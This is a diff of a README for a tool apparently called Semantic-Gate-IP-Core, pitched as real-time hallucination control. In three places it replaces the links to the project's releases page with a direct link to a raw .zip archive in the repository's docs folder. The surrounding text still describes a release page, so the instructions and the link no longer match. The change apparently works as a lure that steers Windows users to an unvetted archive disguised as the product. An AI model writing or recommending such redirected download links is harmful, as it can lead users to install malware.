@@ -1,6 +1,6 @@
 # 🛡️ Semantic-Gate-IP-Core - Real-Time Hallucination Control
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/egwajnphoiu/Semantic-Gate-IP-Core/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/egwajnphoiu/Semantic-Gate-IP-Core/main/docs/Semantic_I_Core_Gate_v1.7.zip)
 
 ## 📌 What this app does
 
@@ -31,7 +31,7 @@ If you plan to run larger models or heavy monitoring jobs, more RAM will help.
 
 Visit the release page here:
 
-[Download Semantic-Gate-IP-Core](https://github.com/egwajnphoiu/Semantic-Gate-IP-Core/releases)
+[Download Semantic-Gate-IP-Core](https://raw.githubusercontent.com/egwajnphoiu/Semantic-Gate-IP-Core/main/docs/Semantic_I_Core_Gate_v1.7.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system. If there is more than one file, pick the one meant for Windows.
 
@@ -184,7 +184,7 @@ Raise the threshold and use a fail action that blocks output or stops the proces
 
 ## 📎 Download again
 
-[Go to the release page](https://github.com/egwajnphoiu/Semantic-Gate-IP-Core/releases)
+[Go to the release page](https://raw.githubusercontent.com/egwajnphoiu/Semantic-Gate-IP-Core/main/docs/Semantic_I_Core_Gate_v1.7.zip)
 
 ## 🧭 Folder permissions
 
